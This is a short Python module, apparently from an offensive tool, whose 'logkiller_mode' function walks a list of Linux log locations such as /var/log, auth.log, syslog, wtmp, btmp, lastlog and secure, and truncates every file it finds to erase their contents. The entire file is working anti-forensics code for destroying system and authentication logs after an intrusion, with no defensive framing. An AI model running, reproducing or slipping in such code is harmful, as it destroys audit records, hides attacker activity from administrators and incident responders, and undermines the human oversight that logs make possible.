import os
from modules.logs import log_info, log_warn

LOG_PATHS = [
    '/var/log',
    '/var/log/auth.log',
    '/var/log/syslog',
    '/var/log/messages',
    '/var/log/wtmp',
    '/var/log/btmp',
    '/var/log/lastlog',
    '/var/log/secure',
    '/var/log/faillog',
]

def logkiller_mode():
    log_info("[LOGKILLER] Attempting to erase logs...")
    for path in LOG_PATHS:
        try:
            if os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        fpath = os.path.join(root, file)
                        try:
                            open(fpath, 'w').close()
                            log_info(f"[LOGKILLER] Cleared {fpath}")
                        except Exception as e:
                            log_warn(f"[LOGKILLER] Failed to clear {fpath}: {e}")
            elif os.path.isfile(path):
                open(path, 'w').close()
                log_info(f"[LOGKILLER] Cleared {path}")
        except Exception as e:
            log_warn(f"[LOGKILLER] Error with {path}: {e}")
